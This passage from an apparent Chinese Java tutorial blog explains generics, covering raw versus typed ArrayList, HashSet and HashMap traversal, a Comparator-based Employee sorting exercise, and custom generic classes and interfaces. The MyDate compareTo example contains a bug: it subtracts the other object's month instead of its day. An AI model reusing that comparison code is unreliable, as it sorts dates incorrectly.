class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//传统方法</span><br><span class="hljs-type">ArrayList</span> <span class="hljs-variable">arrayList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>arrayList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;旺财&quot;</span>,<span class="hljs-number">10</span>));<br>arrayList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;发财&quot;</span>,<span class="hljs-number">1</span>));<br>arrayList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;小黄&quot;</span>,<span class="hljs-number">5</span>));<br><span class="hljs-comment">//遍历</span><br><span class="hljs-keyword">for</span> (Object o :arrayList) &#123;<br>    <span class="hljs-comment">//向下转型</span><br>    <span class="hljs-type">Dog</span> <span class="hljs-variable">dog</span> <span class="hljs-operator">=</span> (Dog) o;<br>    System.out.println(dog.getName()+<span class="hljs-string">&quot;-&quot;</span>+dog.getAge());<br>&#125;<br></code></pre></td></tr></table></figure><p>但如果在添加的时候，不小心添加了一个别的对象（例如一只猫），编译器无法发现异常。在遍历时才会抛出错误。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//不小心添加了一只猫</span><br>arrayList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">&quot;招财猫&quot;</span>,<span class="hljs-number">8</span>));<br></code></pre></td></tr></table></figure><blockquote><p>Exception in thread “main” java.lang.ClassCastException: com.hspedu.generic.Cat cannot be cast to com.hspedu.generic.Dog<br>    at com.hspedu.generic.Generic01.main(Generic01.java:23)</p></blockquote><h3 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a><strong>问题分析</strong></h3><p>1）<strong>不能</strong>对加入到集合 ArrayList中的数据类型<strong>进行约束</strong>（不安全）</p><p>2）遍历的时候，需要进行类型转换，如果集合中的数据量较大，<strong>对效率有影响</strong></p><p>这是一个隐患，所以引出泛型。</p><p>泛型方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//使用泛型</span><br><span class="hljs-comment">//1.当使用 ArrayList&lt;Dog&gt; 表示存放到ArrayList集合中的元素是Dog类型</span><br>ArrayList&lt;Dog&gt; arrayList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Dog&gt;();<br>arrayList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;旺财&quot;</span>,<span class="hljs-number">10</span>));<br>arrayList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;发财&quot;</span>,<span class="hljs-number">1</span>));<br>arrayList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;小黄&quot;</span>,<span class="hljs-number">5</span>));<br><br><span class="hljs-comment">//2.如果编译器发现添加的类型，不满足类型就会报错</span><br><span class="hljs-comment">//arrayList.add(new Cat(&quot;招财猫&quot;,8));</span><br><br><span class="hljs-comment">//3.在遍历的时候可以直接取出Dog类型，而不是Object</span><br><span class="hljs-keyword">for</span> (Dog d :arrayList) &#123;<br>    System.out.println(d.getName()+<span class="hljs-string">&quot;-&quot;</span>+d.getAge());<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="泛型的好处"><a href="#泛型的好处" class="headerlink" title="泛型的好处"></a><strong>泛型的好处</strong></h3><ol><li><p>编译时，检查添加元素的类型，<strong>提高了安全性</strong></p></li><li><p><strong>减少了类型转换的次数</strong>，提高效率</p><p>例如：</p><ul><li>不使用泛型<br>Dog －加入－＞ Object －取出－＞ Dog &#x2F;&#x2F;放入到ArrayList 会先转成 Object，在取出时，还需要转换成 Dog</li><li>使用泛型<br>Dog －＞ Dog －＞Dog&#x2F;&#x2F;放入时，和取出时，不需要类型转换，提高效率</li></ul></li><li><p>不再提示编译警告</p></li></ol><h2 id="2-泛型说明"><a href="#2-泛型说明" class="headerlink" title="2.泛型说明"></a>2.泛型说明</h2><p>泛型就是一种可以表示数据类型的数据类型。</p><p>int a &#x3D; 10、1、2、3….</p><p>E &#x3D; Integer、String、Dog..</p><p>理解： 泛（广泛）型（类型） ＝＞ Integer， String，Dog</p><p>1）泛型又称<strong>参数化类型，</strong>是Jdk5.0出现的新特性，<strong>解决数据类型的安全性问题</strong></p><p>2）在类声明或实例化时只要<strong>指定好需要的具体的类型</strong>即可。</p><p>3）Java泛型可以保证如果程序在编译时没有发出警告，运行时就不会产生<br>ClassCastException异常。同时，代码更加简洁、健壮</p><p>4）泛型的作用是：<strong>可以在类声明时通过一个标识表示类中某个属性的类型</strong>，或者是某个方法的返回值的类型，或者是参数类型。［举例Generic03.java］</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">Person&lt;String&gt; stringPerson = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>&lt;String&gt;(<span class="hljs-string">&quot;韩顺平教育&quot;</span>);<br>Person&lt;Integer&gt; integerPerson = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>&lt;Integer&gt;(<span class="hljs-number">100</span>);<br>stringPerson.show(); <span class="hljs-comment">//class java.lang.String</span><br>integerPerson.show(); <span class="hljs-comment">//class java.lang.Integer</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>&lt;E&gt;&#123;<br>    E s; <span class="hljs-comment">//该数据类型，在定义Person对象的时候指定，即在编译期间，就确定E是什么类型。</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(E s)</span> &#123;<br>        <span class="hljs-built_in">this</span>.s = s;<br>    &#125;<br>    <span class="hljs-keyword">public</span> E <span class="hljs-title function_">f</span><span class="hljs-params">()</span>&#123; <span class="hljs-comment">//返回类型使用E</span><br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(s.getClass()); <span class="hljs-comment">//显示s的运行类型</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="泛型的声明"><a href="#泛型的声明" class="headerlink" title="泛型的声明"></a><strong>泛型的声明</strong></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">interface 接口&lt;T&gt;&#123;&#125; 和 class 类&lt;K,V&gt;&#123;&#125;<br></code></pre></td></tr></table></figure><ol><li>其中，T、K、V不代表值，而是表示类型</li><li>任意字母都可以。常用T表示，是Type的缩写</li></ol><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//list接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">List</span>&lt;E&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Collection</span>&lt;E&gt; &#123;...&#125;<br></code></pre></td></tr></table></figure><h3 id="泛型的实例化"><a href="#泛型的实例化" class="headerlink" title="泛型的实例化"></a><strong>泛型的实例化</strong></h3><p>要在类名后面指定类型参数的值（类型）。如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;String&gt; strList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;String&gt;();<br>Iterator&lt;Customer&gt; iterator = customers.iterator();<br></code></pre></td></tr></table></figure><h3 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a><strong>举例说明</strong></h3><blockquote><p>泛型在HashSet和HashMap的使用情况</p><p>练习：<br>1.创建 3个学生对象</p><p>2.放入到HashSet学生对象，使用.</p><p>3.放入到 HashMap中，要求 Key是 String name，Value就是 学生对象</p><p>4.使用两种方式遍历</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//1. HashSet</span><br>HashSet&lt;Student&gt; set = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;Student&gt;();<br>set.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;john&quot;</span>,<span class="hljs-number">12</span>));<br>set.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;jack&quot;</span>,<span class="hljs-number">18</span>));<br>set.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;mary&quot;</span>,<span class="hljs-number">20</span>));<br><span class="hljs-comment">//遍历-增强for</span><br>System.out.println(<span class="hljs-string">&quot;hashset遍历-增强for&quot;</span>);<br><span class="hljs-keyword">for</span> (Student o :set) &#123;<br>    System.out.println(o);<br>&#125;<br><span class="hljs-comment">//遍历-迭代器</span><br>System.out.println(<span class="hljs-string">&quot;hashset遍历-迭代器&quot;</span>);<br>Iterator&lt;Student&gt; iterator = set.iterator();<br><span class="hljs-keyword">while</span>(iterator.hasNext())&#123;<br>    <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> iterator.next();<br>    System.out.println(student);<br>&#125;<br><br><span class="hljs-comment">//2. HashMap</span><br>HashMap&lt;String, Student&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Student&gt;();<br>hashMap.put(<span class="hljs-string">&quot;tim&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;tim&quot;</span>,<span class="hljs-number">13</span>));<br>hashMap.put(<span class="hljs-string">&quot;smith&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;smith&quot;</span>,<span class="hljs-number">20</span>));<br>hashMap.put(<span class="hljs-string">&quot;hsp&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;hsp&quot;</span>,<span class="hljs-number">28</span>));<br><span class="hljs-comment">//遍历-entryset</span><br>System.out.println(<span class="hljs-string">&quot;hashmap遍历-entryset&quot;</span>);<br>Set&lt;Map.Entry&lt;String, Student&gt;&gt; entries = hashMap.entrySet();<br>Iterator&lt;Map.Entry&lt;String, Student&gt;&gt; iterator1 = entries.iterator();<br><span class="hljs-keyword">while</span> (iterator1.hasNext()) &#123;<br>    Map.Entry&lt;String, Student&gt; next =  iterator1.next();<br>    System.out.println(next);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-泛型的注意事项"><a href="#3-泛型的注意事项" class="headerlink" title="3.泛型的注意事项"></a>3.泛型的注意事项</h2><ol><li>interface List＜T＞{}， public class HashSet＜E＞{}… 等等</li></ol><p>   说明：<strong>T，E 只能是引用类型</strong></p><p>   看看下面语句是否正确？：</p>   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Integer&gt; list =<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Integer&gt;(); <span class="hljs-comment">//OK</span><br>List&lt;<span class="hljs-type">int</span>&gt; list2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;<span class="hljs-type">int</span>&gt;(); <span class="hljs-comment">//报错（不能是基本数据类型）</span><br></code></pre></td></tr></table></figure><ol start="2"><li><p>在<strong>指定泛型具体类型后</strong>，可以传入<strong>该类型</strong>或者其<strong>子类类型</strong></p></li><li><p>泛型使用形式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Integer&gt; list1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Integer&gt; ();<br>List&lt;Integer&gt; list2 ＝ <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <span class="hljs-comment">//简写</span><br><span class="hljs-comment">//编译器会进行类型推断，实际开发中，往往选择简写</span><br></code></pre></td></tr></table></figure></li></ol><p>如果我们这样写 List list3 ＝new ArrayList()；</p><p>默认给它的 泛型是 Object</p><p>即：<code>List&lt;Object&gt; list3 ＝new ArrayList&lt;&gt;();</code></p><h2 id="练习-6"><a href="#练习-6" class="headerlink" title="练习"></a>练习</h2><blockquote><p> 定义Employee类<br>1） 该类包含：private成员变量name，sal，birthday，其中birthday为MyDate 类的对象；<br>2） 为每一个属性定义 getter，setter 方法；<br>3）重写 toString 方法输出 name，sal，birthday<br>4） MyDate类包含： private成员变量month，day，year；并为每一个属性定义 getter setter 方法；<br>5）创建该类的3个对象，并把这些对象放入 ArrayList集合中（ArrayList 需使用泛型来定义），对集合中的元素进行排序，并遍历输出：</p><p>排序方式: 调用ArrayList 的 sort 方法，传入 Comparator对象［使用泛型］，先按照name排序，如果name相同，则按生日日期的先后排序。【即：定制排序】<br>有一定难度，比较经典泛型使用案例</p></blockquote><p>Employee类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> String name;<br><span class="hljs-keyword">private</span> <span class="hljs-type">double</span> sal;<br><span class="hljs-keyword">private</span> MyDate birthday;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;名字：&quot;</span> + name +<br>            <span class="hljs-string">&quot;, 薪水：&quot;</span> + sal +<br>            <span class="hljs-string">&quot;, 生日：&quot;</span> + birthday<br>            ;<br>&#125;<br><span class="hljs-comment">/** 省略构造器、getset、tostring详细代码 **/</span><br></code></pre></td></tr></table></figure><p>MyDate类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyDate</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Comparable</span>&lt;MyDate&gt;&#123;<br>    <span class="hljs-comment">//MyDate类包含： private成员变量month，day，year；并为每一个属性定义 getter setter 方法；</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> year;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> month;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> day;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compareTo</span><span class="hljs-params">(MyDate o)</span> &#123;<br>        <span class="hljs-comment">//比较birthday</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">yearMinus</span> <span class="hljs-operator">=</span> year - o.getYear();<br>        <span class="hljs-keyword">if</span> (yearMinus!=<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> yearMinus;<br>        &#125;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">monthMinus</span> <span class="hljs-operator">=</span> month - o.getMonth();<br>        <span class="hljs-keyword">if</span> (monthMinus!=<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> monthMinus;<br>        &#125;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">dayMinus</span> <span class="hljs-operator">=</span> day - o.getMonth();<br>        <span class="hljs-keyword">return</span> dayMinus;<br>    &#125;<br>  <br>  <span class="hljs-comment">/** 省略构造器、getset、tostring详细代码 **/</span><br>&#125;<br></code></pre></td></tr></table></figure><p>Main: 添加数据，调用方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java">ArrayList&lt;Employee&gt; employees = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>employees.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>(<span class="hljs-string">&quot;john&quot;</span>, <span class="hljs-number">1200</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyDate</span>(<span class="hljs-number">2000</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)));<br>employees.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>(<span class="hljs-string">&quot;mary&quot;</span>, <span class="hljs-number">3800</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyDate</span>(<span class="hljs-number">1999</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>)));<br>employees.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>(<span class="hljs-string">&quot;tom&quot;</span>, <span class="hljs-number">3900</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyDate</span>(<span class="hljs-number">2002</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)));<br>employees.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>(<span class="hljs-string">&quot;mary&quot;</span>, <span class="hljs-number">3800</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyDate</span>(<span class="hljs-number">1999</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>)));<br>employees.sort(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>&lt;Employee&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(Employee o1, Employee o2)</span> &#123;<br>        <span class="hljs-comment">//先对传入的参数进行验证</span><br>        <span class="hljs-keyword">if</span> (!(o1 <span class="hljs-keyword">instanceof</span> Employee &amp;&amp; o2 <span class="hljs-keyword">instanceof</span> Employee)) &#123;<br>            System.out.println(<span class="hljs-string">&quot;类型不正确&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-comment">//比较name</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> (o1.getName()).compareTo(o2.getName());<br>        <span class="hljs-keyword">if</span> (a != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> a;<br>        &#125;<br>        <span class="hljs-comment">//比较birthday</span><br>        <span class="hljs-keyword">return</span> o1.getBirthday().compareTo(o2.getBirthday());<br>    &#125;<br>&#125;);<br><span class="hljs-comment">//遍历输出</span><br><span class="hljs-keyword">for</span> (Employee o : employees) &#123;<br>    System.out.println(o);<br>&#125;<br></code></pre></td></tr></table></figure><p>输出：</p><blockquote><p>名字：john, 薪水：1200.0, 生日：2000-1-2<br>名字：mary, 薪水：3800.0, 生日：1999-5-1<br>名字：mary, 薪水：3800.0, 生日：1999-6-1<br>名字：tom, 薪水：3900.0, 生日：2002-4-5</p></blockquote><h2 id="4-自定义泛型"><a href="#4-自定义泛型" class="headerlink" title="4.自定义泛型"></a>4.自定义泛型</h2><h3 id="自定义泛型"><a href="#自定义泛型" class="headerlink" title="自定义泛型"></a>自定义泛型</h3><h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">class 类名&lt;T,R...&gt;&#123;<br>成员<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>普通成员可以使用泛型（属性、方法）</li><li>使用泛型的数组，<strong>不能初始化</strong></li><li><strong>静态方法中不能</strong>使用类的泛型</li><li>泛型类的类型，是在<strong>创建对象时确定</strong>的（因为创建对象时，需要指定确定类型）</li><li>如果在创建对象时，没有指定类型，<strong>默认为Object</strong></li></ol><p>测试：说明自定义泛型代码是否正确，并说明原因</p><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//MyGeneric&lt;T,R,M&gt;</span><br>MyGeneric&lt;Double,String,Integer&gt; g = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyGeneric</span>&lt;&gt;(<span class="hljs-string">&quot;john&quot;</span>);<br>g.setT(<span class="hljs-number">10.9</span>): <span class="hljs-comment">//</span><br>g.setT(<span class="hljs-string">&quot;yy&quot;</span>);<span class="hljs-comment">//</span><br>System.out.println(g);<br><span class="hljs-type">MyGeneric</span> <span class="hljs-variable">g2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyGeneric</span>(<span class="hljs-string">&quot;john~~&quot;</span>); <br>g2.setT(<span class="hljs-string">&quot;yy&quot;</span>); <span class="hljs-comment">//</span><br>System.out.println(<span class="hljs-string">&quot;g2=&quot;</span> + g2);<br><br></code></pre></td></tr></table></figure></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-comment">//MyGeneric&lt;T,R,M&gt;</span><br>        MyGeneric&lt;Double,String,Integer&gt; g = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyGeneric</span>&lt;&gt;(<span class="hljs-string">&quot;john&quot;</span>);<br>        g.setT(<span class="hljs-number">10.9</span>); <span class="hljs-comment">//OK</span><br><span class="hljs-comment">//        g.setT(&quot;yy&quot;);//类型有误,一开始就定义了T 为 Double</span><br>        System.out.println(g);<br><br>        <span class="hljs-type">MyGeneric</span> <span class="hljs-variable">g2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyGeneric</span>(<span class="hljs-string">&quot;john~~&quot;</span>); <span class="hljs-comment">//泛型默认为Object</span><br>        g2.setT(<span class="hljs-string">&quot;yy&quot;</span>); <br>g2.setT(<span class="hljs-number">111</span>); <span class="hljs-comment">//添加的元素会覆盖原先的，不会报错</span><br>        System.out.println(<span class="hljs-string">&quot;g2=&quot;</span> + g2);<br></code></pre></td></tr></table></figure><p>输出：</p><p>MyGeneric{name&#x3D;’john’, r&#x3D;null, m&#x3D;null, t&#x3D;10.9}<br>g2&#x3D;MyGeneric{name&#x3D;’john~~’, r&#x3D;null, m&#x3D;null, t&#x3D;111}</p><h3 id="自定义泛型接口"><a href="#自定义泛型接口" class="headerlink" title="自定义泛型接口"></a>自定义泛型接口</h3><h4 id="基本语法-1"><a href="#基本语法-1" class="headerlink" title="基本语法"></a>基本语法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">interface 接口名&lt;T,R...&gt;&#123;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="注意细节"><a href="#注意细节" class="headerlink" title="注意细节"></a>注意细节</h4><ol><li>接口中，静态成员也不能使用泛型（这个和泛型类规定一样）</li><li>泛型接口的类型，在<strong>继承接口</strong>或者<strong>实现接口</strong>时确定</li><li>没有指定类型，默认为Object</li></ol><p>案例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IUsb</span>&lt;U,R&gt;&#123;<br>    <span class="hljs-comment">//普通方法中，可以使用接口泛型</span><br>    R <span class="hljs-title function_">get</span><span class="hljs-params">(U u)</span>;<br>    <span class="hljs-comment">//U name; 不能这样使用</span><br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">hi</span><span class="hljs-params">(R r)</span>;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">(R r1, R r2, U u1, U u2)</span>;<br>    <span class="hljs-comment">//在jdk8 中，可以在接口中，使用默认方法，也是可以使用泛型</span><br>    <span class="hljs-keyword">default</span> R <span class="hljs-title function_">method</span><span class="hljs-params">(U u)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//在继承接口 指定泛型接口的类型</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IA</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">IUsb</span>&lt;String,Double&gt;&#123;<br>&#125;<br><span class="hljs-comment">//当我们去实现IA接口时，因为IA在继承IUsu接口时，指定了U为String，R为Double</span><br><span class="hljs-comment">//在实现IUsu接口的方法时，使用String替换U，Double替换D</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">AA</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IA</span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Double <span class="hljs-title function_">get</span><span class="hljs-params">(String s)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span 